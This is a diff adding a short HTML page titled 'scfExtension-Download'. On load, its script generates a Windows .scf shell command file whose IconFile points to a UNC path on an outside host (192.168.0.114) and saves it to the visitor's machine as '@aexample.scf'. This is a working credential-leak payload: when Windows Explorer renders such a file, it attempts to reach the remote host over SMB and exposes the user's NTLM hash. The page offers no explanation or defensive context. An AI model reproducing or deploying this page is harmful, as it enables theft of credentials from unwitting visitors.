@@ -1,0 +1,31 @@
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <title>scfExtension-Download</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+	<script src = "https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.0/FileSaver.min.js" integrity="sha512-csNcFYJniKjJxRWRV1R7fvnXrycHP6qDR21mgz1ZP55xY5d+aHLfo9/FcGDQLfn2IfngbAHd8LdfsagcCqgTcQ==" crossorigin = "anonymous" referrerpolicy = "no-referrer"> </script>
+
+</head>
+
+<body>
+ 
+	<script>
+	//const data = "[Shell]\nIconFile=\\192.168.0.114\abc";
+	const data = "[shell]\nCommand=2\nIconFile=//192.168.0.114/abc.ico\n[Taskbar]\nCommand=ToggleDesktop";
+	const blob = new Blob([data], { type: 'text/plain' });
+	const fileUrl = URL.createObjectURL(blob);
+	const a = document.createElement('a');
+	a.href = fileUrl;
+	a.download = '@aexample.scf';
+	a.click();
+
+
+
+    </script>
+</body>
+
+</html>
